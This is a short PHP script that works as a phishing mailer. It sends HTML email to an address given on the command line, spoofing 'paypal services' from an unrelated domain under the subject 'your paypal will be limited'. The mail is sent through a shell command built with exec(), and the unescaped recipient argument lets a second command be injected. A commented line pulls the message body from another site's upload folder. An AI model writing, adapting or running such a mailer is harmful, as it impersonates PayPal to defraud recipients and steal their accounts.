<?php
$argument1 = $argv[1];
$headers2 = 'MIME-Version: 1.0' . "\r\n" .
    'Content-Type: text/html; charset=iso-8859-1' . "\r\n" .
    'From: paypal services<info@akhbarlibya24.net>' . "\r\n" .
    'Reply-To: paypal services<info@akhbarlibya24.net>' . "\r\n" .
    'X-Mailer: PHP/' . phpversion();
    $subject2 = 'your paypal will be limited';
    /*$message2 = file_get_contents('http://ymcacolumbus.org/track-levelup/server/php/files/msg.html');*/
	$cmd = "sleep 60 && mail -a 'Content-type: text/html' -s 'your paypal will be limited' -aFrom:'paypal services<info@akhbarlibya24.net>' $argument1 < msg.html";
	exec($cmd . " > /dev/null &"); 
?>